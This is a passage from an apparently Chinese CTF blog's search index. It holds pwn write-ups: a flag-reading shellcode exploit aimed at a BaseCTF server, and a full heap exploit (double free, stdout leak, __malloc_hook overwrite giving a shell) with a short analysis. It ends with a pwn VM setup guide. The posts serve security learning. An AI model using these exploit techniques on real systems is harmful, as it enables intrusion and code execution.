class="hljs-built_in">print</span>(b+<span class="hljs-string">&quot;:&quot;</span>+<span class="hljs-built_in">hex</span>(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recv(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pre</span>(<span class="hljs-params">a</span>) : <span class="hljs-built_in">print</span>(p.recv(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reu</span>(<span class="hljs-params">a,b=<span class="hljs-literal">False</span></span>) : <span class="hljs-keyword">return</span> p.recvuntil(a,drop=b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rel</span>() : <span class="hljs-keyword">return</span> p.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">se</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sea</span>(<span class="hljs-params">a,b</span>) : p.sendafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sel</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sela</span>(<span class="hljs-params">a,b</span>) : p.sendlineafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">op</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cp</span>() : p.close()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr64</span>() : <span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr32</span>() : <span class="hljs-keyword">return</span> u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_T</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(re(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_A</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(reu(<span class="hljs-string">b&quot;-&quot;</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw_rop64</span>(<span class="hljs-params">pop_rdi,pop_rsi,pop_rdx,flag_addr,open_addr,read_addr,write_addr</span>):<br>    orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(open_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(read_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(write_addr)<br>    <span class="hljs-keyword">return</span> orw<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getorw</span>(<span class="hljs-params">name,buf,Arch</span>) :<br>    sh=shellcraft.<span class="hljs-built_in">open</span>(name)<br>    sh+=shellcraft.read(<span class="hljs-number">3</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh+=shellcraft.write(<span class="hljs-number">1</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh=asm(sh,arch=Arch)<br>    <span class="hljs-keyword">return</span> sh<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdbp</span>(<span class="hljs-params">p,a=<span class="hljs-string">&#x27;&#x27;</span></span>) :<br>    <span class="hljs-keyword">if</span> a!=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(p,a)<br>        pause()<br>    <span class="hljs-keyword">else</span> :<br>        gdb.attach(p)<br>        pause()<br><br>p = remote(<span class="hljs-string">&quot;challenge.basectf.fun&quot;</span>, <span class="hljs-number">23687</span>)<br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment">#elf = ELF(&quot;./pwn&quot;)</span><br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="hljs-comment">#lib = cdll.LoadLibrary(None)</span><br><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-g&quot;, &quot;9999&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><span class="hljs-comment">#elf.arch , elf.so</span><br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rbx,0x0000000067616C66</span><br><span class="hljs-string">    push rbx</span><br><span class="hljs-string">    mov rdi,-100</span><br><span class="hljs-string">    mov rsi,rsp</span><br><span class="hljs-string">    xor rdx,rdx</span><br><span class="hljs-string">    mov rax,257</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    mov rdi,1</span><br><span class="hljs-string">    mov rsi,3</span><br><span class="hljs-string">    xor rdx,rdx</span><br><span class="hljs-string">    mov r10,0x40</span><br><span class="hljs-string">    mov rax,40</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>)<br>se(shellcode)<br><br>op()<br></code></pre></td></tr></table></figure><hr><h3 id="UnKnow-–Pwn–mcback2dabasics"><a href="#UnKnow-–Pwn–mcback2dabasics" class="headerlink" title="[UnKnow]–Pwn–mcback2dabasics"></a><strong>[UnKnow]–Pwn–mcback2dabasics</strong></h3><p><strong>链接：</strong> <a href="https://z-l-s-f.lanzouq.com/iu89w2a10gyj">https://z-l-s-f.lanzouq.com/iu89w2a10gyj</a></p><p><strong>Glibc: Ubuntu GLIBC 2.24-9ubuntu2.2</strong></p><p><strong>check:</strong></p><p><img src="/2024/09/13/Pwn-2024-S-001-ZB/011.png" alt="011"></p><p>​64位程序，保护全开。</p><p><strong>ida漏洞分析如下：</strong></p><p><img src="/2024/09/13/Pwn-2024-S-001-ZB/012.png" alt="012"></p><p><img src="/2024/09/13/Pwn-2024-S-001-ZB/013.png" alt="013"></p><p><img src="/2024/09/13/Pwn-2024-S-001-ZB/014.png" alt="014"></p><p>​没有修改函数和输出函数的堆题。</p><p>​幸运的是存在uaf漏洞，不幸的是只存在uaf漏洞。这里我们可以启用一种古老的堆题解法——double free。</p><p>​虽然我们不知道堆上的地址，但是好歹一个字节还是可以确定的，通过double free可以修改fd的最后一个字节来使得fastbin链指向堆块中伪造的地址。这样我们就有了堆块错位写的权限，通过这个权限我们可以获得足够大的堆块来获得unsortbin。通过修改unsortbin的fd地址的后两个字节的地址指向IO中的stdout（1&#x2F;8的机会成功）。</p><p>​后面的操作就是如法炮制，反复使用double free来修改IO中的stdout来输出一个libc的地址。</p><p>算出libc基地址后攻击malloc（realloc调栈）来getshell。</p><p><strong>exp：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from ctypes import *</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stre</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(a).encode()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ph</span>(<span class="hljs-params">a,b=<span class="hljs-string">&quot;addr&quot;</span></span>) : <span class="hljs-built_in">print</span>(b+<span class="hljs-string">&quot;:&quot;</span>+<span class="hljs-built_in">hex</span>(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recv(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pre</span>(<span class="hljs-params">a</span>) : <span class="hljs-built_in">print</span>(p.recv(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reu</span>(<span class="hljs-params">a,b=<span class="hljs-literal">False</span></span>) : <span class="hljs-keyword">return</span> p.recvuntil(a,drop=b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rel</span>() : <span class="hljs-keyword">return</span> p.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">se</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sea</span>(<span class="hljs-params">a,b</span>) : p.sendafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sel</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sela</span>(<span class="hljs-params">a,b</span>) : p.sendlineafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">op</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cp</span>() : p.close()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr64</span>() : <span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr32</span>() : <span class="hljs-keyword">return</span> u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_T</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(re(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_A</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(reu(<span class="hljs-string">b&quot;-&quot;</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw_rop64</span>(<span class="hljs-params">pop_rdi,pop_rsi,pop_rdx,flag_addr,open_addr,read_addr,write_addr</span>) :<br>    orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(open_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(read_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(write_addr)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getorw</span>(<span class="hljs-params">name,buf,Arch</span>) :<br>    sh=shellcraft.<span class="hljs-built_in">open</span>(name)<br>    sh+=shellcraft.read(<span class="hljs-number">3</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh+=shellcraft.write(<span class="hljs-number">1</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh=asm(sh,arch=Arch)<br>    <span class="hljs-keyword">return</span> sh<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdbp</span>(<span class="hljs-params">p,a=<span class="hljs-string">&#x27;&#x27;</span></span>) :<br>    <span class="hljs-keyword">if</span> a!=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(p,a)<br>        pause()<br>    <span class="hljs-keyword">else</span> :<br>        gdb.attach(p)<br>        pause()<br><br><span class="hljs-comment">#p = remote(&#123;IP&#125;)</span><br>p = process(<span class="hljs-string">&quot;./heap&quot;</span>)<br><span class="hljs-comment">#elf = ELF(&quot;./pwn&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment">#lib = cdll.LoadLibrary(None)</span><br><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-g&quot;, &quot;9999&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-comment">#context.arch = &#x27;amd64&#x27;</span><br><span class="hljs-comment">#context.os = &#x27;linux&#x27;</span><br><span class="hljs-comment">#elf.arch , elf.so</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    sela(<span class="hljs-string">b&quot;[+]&gt; &quot;</span>,stre(<span class="hljs-number">1</span>))<br>    sela(<span class="hljs-string">b&quot;[+]&gt; &quot;</span>,stre(size))<br>    sea(<span class="hljs-string">b&quot;Data?\n&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add2</span>(<span class="hljs-params">size,content</span>):<br>    sela(<span class="hljs-string">b&quot;[+]&gt; &quot;</span>,stre(<span class="hljs-number">1</span>))<br>    sela(<span class="hljs-string">b&quot;[+]&gt; &quot;</span>,stre(size))<br>    sea(<span class="hljs-string">b&quot;Data?&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">index</span>):<br>    sela(<span class="hljs-string">b&quot;[+]&gt; &quot;</span>,stre(<span class="hljs-number">2</span>))<br>    sela(<span class="hljs-string">b&quot;[+]&gt; &quot;</span>,stre(index))<br><br>add(<span class="hljs-number">0x67</span>,<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x8</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x67</span>,<span class="hljs-string">b&quot;B&quot;</span>*<span class="hljs-number">0x38</span>+p64(<span class="hljs-number">0x71</span>)) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x67</span>,<span class="hljs-string">b&quot;C&quot;</span>*<span class="hljs-number">0x8</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x67</span>,<span class="hljs-string">b&quot;D&quot;</span>*<span class="hljs-number">0x8</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x67</span>,<span class="hljs-string">b&quot;E&quot;</span>*<span class="hljs-number">0x8</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x67</span>,<span class="hljs-string">b&quot;F&quot;</span>*<span class="hljs-number">0x8</span>) <span class="hljs-comment">#5</span><br>dele(<span class="hljs-number">0</span>)<br>dele(<span class="hljs-number">1</span>)<br>dele(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x67</span>,<span class="hljs-string">b&quot;\xb0&quot;</span>) <span class="hljs-comment">#6</span><br>add(<span class="hljs-number">0x67</span>,<span class="hljs-string">b&quot;Z&quot;</span>*<span class="hljs-number">0x8</span>) <span class="hljs-comment">#7</span><br>add(<span class="hljs-number">0x67</span>,<span class="hljs-string">b&quot;Z&quot;</span>*<span class="hljs-number">0x8</span>) <span class="hljs-comment">#8</span><br>add(<span class="hljs-number">0x67</span>,<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x28</span>+p64(<span class="hljs-number">0xE1</span>)) <span class="hljs-comment">#9</span><br>dele(<span class="hljs-number">2</span>)<br>dele(<span class="hljs-number">7</span>)<br>dele(<span class="hljs-number">8</span>)<br>dele(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">0x67</span>,<span class="hljs-string">b&quot;\xb0&quot;</span>) <span class="hljs-comment">#10</span><br>add(<span class="hljs-number">0x67</span>,<span class="hljs-string">b&quot;Z&quot;</span>*<span class="hljs-number">0x8</span>) <span class="hljs-comment">#11</span><br>add(<span class="hljs-number">0x67</span>,<span class="hljs-string">b&quot;Z&quot;</span>*<span class="hljs-number">0x8</span>) <span class="hljs-comment">#12</span><br>add(<span class="hljs-number">0x67</span>,<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x28</span>+p64(<span class="hljs-number">0x71</span>)+<span class="hljs-string">b&quot;\xbd\x25&quot;</span>)<br>dele(<span class="hljs-number">11</span>)<br>dele(<span class="hljs-number">12</span>)<br>dele(<span class="hljs-number">11</span>)<br>add(<span class="hljs-number">0x67</span>,<span class="hljs-string">b&quot;\xe0&quot;</span>) <span class="hljs-comment">#13</span><br>add(<span class="hljs-number">0x67</span>,<span class="hljs-string">b&quot;Z&quot;</span>*<span class="hljs-number">0x8</span>) <span class="hljs-comment">#14</span><br>add(<span class="hljs-number">0x67</span>,<span class="hljs-string">b&quot;Z&quot;</span>*<span class="hljs-number">0x8</span>) <span class="hljs-comment">#15</span><br>add(<span class="hljs-number">0x67</span>,<span class="hljs-string">b&quot;Z&quot;</span>*<span class="hljs-number">0x8</span>) <span class="hljs-comment">#16</span><br>add(<span class="hljs-number">0x67</span>,<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x33</span>+p64(<span class="hljs-number">0xfbad1800</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+<span class="hljs-string">b&quot;\x00&quot;</span>) <span class="hljs-comment">#17</span><br>re(<span class="hljs-number">0x20</span>)<br>libc_base = raddr64() - <span class="hljs-number">0x3c2600</span><br>ph(libc_base,<span class="hljs-string">&quot;libc_base&quot;</span>)<br>malloc_hook = libc_base + libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&quot;__free_hook&quot;</span>]<br>one = libc_base + <span class="hljs-number">0xf24cb</span><br>realloc_hook = libc_base + libc.sym[<span class="hljs-string">&quot;__libc_realloc&quot;</span>]<br><br>dele(<span class="hljs-number">14</span>)<br>dele(<span class="hljs-number">15</span>)<br>dele(<span class="hljs-number">14</span>)<br><br>add2(<span class="hljs-number">0x67</span>,p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>add2(<span class="hljs-number">0x67</span>,<span class="hljs-string">b&quot;X&quot;</span>*<span class="hljs-number">0x8</span>)<br>add2(<span class="hljs-number">0x67</span>,<span class="hljs-string">b&quot;X&quot;</span>*<span class="hljs-number">0x8</span>)<br>add2(<span class="hljs-number">0x67</span>,<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0xB</span>+p64(one)+p64(realloc_hook))<br><br>sela(<span class="hljs-string">b&quot;[+]&gt; &quot;</span>,stre(<span class="hljs-number">1</span>))<br>sela(<span class="hljs-string">b&quot;[+]&gt; &quot;</span>,stre(<span class="hljs-number">32</span>))<br><br><br>op()<br></code></pre></td></tr></table></figure><hr>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>pwn环境预制镜像</title>
    <link href="/2024/07/27/pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2024/07/27/pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<br><h3 id="pwn环境预制镜像"><a href="#pwn环境预制镜像" class="headerlink" title="pwn环境预制镜像"></a>pwn环境预制镜像</h3><hr><p><strong>XTpwn-UBUNUT</strong></p><br><p><strong>阿里云盘</strong>：<a href="https://www.alipan.com/s/e3cy98miaXT">https://www.alipan.com/s/e3cy98miaXT</a></p><p><strong>提取码</strong> ：2h0c</p><hr><p><strong>登录的用户名和密码</strong></p><br><p>用户名:xtpwn&#x2F;XTPWN<br>密码:pwnyes!</p><p>用户名:root<br>密码:toor</p><hr><p><strong>基础情况</strong></p><br><p>基础镜像：Ubuntu24.04 LTS<br>工具清单：<br>    pwntools Version: 4.12.0<br>    gdb-&gt;pwndbg (2024.6.30克隆)<br>    ROPgadget v7.4<br>    OneGadget Version 1.9.0<br>    SeccompTools Version 1.6.1<br>    glibc-all-in-one (2024.6.30克隆）<br>    zsh-&gt;oh-my-zsh-&gt;powerlevel10k (2024.6.30安装)</p><hr><p><strong>食用方法</strong></p><br><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">1.下载后将文件XTpwn.MP4改为XTpwn.zip<br>2.将XTpwn-UBUNTU.ova解压出来<br>3.运行virtualbox7.0.18.exe自解压程序到合适位置<br>4.运行VirtualBox-7.0.18-162988-Win.exe安装程序到合适位置<br>5.安装Oracle_VM_VirtualBox_Extension_Pack-7.0.18.vbox-extpack扩展包 【可选】（方法自行百度）<br>6.打开Oracle VM VirtualBox，选择管理-&gt;导入虚拟电脑-&gt;选择一个文件-&gt;选中XTpwn-UBUNTU.ova<br>-&gt;选择默认虚拟电脑位置为一个较大空间的盘的文件夹（这里是以后虚拟机硬盘的位置）-&gt;完成<br>-&gt;选中左侧的新增选项-&gt;启动<br></code></pre></td></tr></table></figure><hr><p><strong>可能的问题</strong></p><br><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">一直卡在启动界面<br>    原因：ubuntu版本太新，要等以后virtualbox更新<br>    解决：重启虚拟机即可<br>启动虚拟机后闪屏：<br>    原因：未开启3D加速<br>    解决：设置-&gt;显示-&gt;启用3D加速<br>    注意：开启3D加速后会出现开启窗口鬼畜的情况，请移步追加修补<br>未开启电脑虚拟化<br>    解决：https://answer.baidu.com/answer/land?params=%2BXJJPHYvVnkHCzT6mcfyUlHLwLQkdgXUmrjIA3DeEoCZZ5kbbOm36c0cMeWofVpVtjNst%2FXITE8sm%2FN0zzJ8LGBMWHE7Ih6CmEJoYzUq3YbknCis6eGvAK%2BOgtUW78tDu1y8uLclVe39d%2FHs7IGkNtrTf7ChjMe65lBB8%2BEcU1rqho844pbmYDNK%2BoKAXs6nDsXZHsqGXBikY5WHv4P5uLuCbgUj98PYKzUHf%2FjJ2LU%3D&amp;from=dqa&amp;lid=b50dacb000044d9f&amp;word=%E5%A6%82%E4%BD%95%E5%BC%80%E5%90%AF%E7%94%B5%E8%84%91%E8%99%9A%E6%8B%9F%E5%8C%96<br></code></pre></td></tr></table></figure><hr><p><strong>2024&#x2F;7&#x2F;21追加修补</strong></p><p>使用命令赋予用户共享文件夹权限（可以直接用cp复制共享目录下的文件）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> usermod -a -G vboxsf [你的用户名]<br><span class="hljs-built_in">sudo</span> reboot<br></code></pre></td></tr></table></figure><p><strong>2024&#x2F;7&#x2F;27追加修补</strong></p><p>解决开启3D加速后窗口鬼畜问题问题</p><p>原因：virtualbox还未对最新的ubuntu24.04的默认图形化系统做出3D加速适配，我们可以通过切换其他的图形化系统来解决这个问题。</p><p>1.安装XFCE界面</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> apt install tasksel<br><span class="hljs-built_in">sudo</span> tasksel<br></code></pre></td></tr></table></figure><p><img src="/2024/07/27/pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/xfceinstall.png"></p><p>通过按↓到xfce，按空格键选择xfce，按TEB键移动到OK，按Enter键确认安装。</p><p><img src="/2024/07/27/pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/xfceinstall2.png"></p><p>一旦在进程之间开始安装 XFCE，它就会要求选择显示管理器。选择 “gdm3”，按 Tab 移至OK，然后按Enter键。最后重启系统。</p><p><img src="/2024/07/27/pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/xfceinstall3.png"></p><p>按以上方式选择XFCE会话输入密码登录后进入XFCE图形化界面。</p><p><img src="/2024/07/27/pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/xfceinstall5.png"></p><p>效果展示。</p><br><p>还可以选择KDE图形化环境，在选择XFCE时选择KDE Plasma即可。</p><p><img src="/2024/07/27/pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/KDEinstall.png"></p><p>效果展示。（KDE更好看，对电脑性能有信心的可以选择这个）</p><hr><p>如果你认为此虚拟机装的不好用。</p><p>是的，它确实不好用。</p><p>准确来说，它是一个实验性作物。</p><p>如果你装一台自己的<strong>PWN虚拟机</strong> ，那就继续往下看。</p><hr><p>别自己装了，太累了，墙的厉害，很多工具都不好装，刚自己想在装一个，累的够呛。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>start</title>
    <link href="/2024/07/18/start/"/>
    <url>/2024/07/18/start/</url>
    
    <content type="html"><![CDATA[<h3><center>Let's Start</center></h3><p><img src="/2024/07/18/start/start.jpg"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
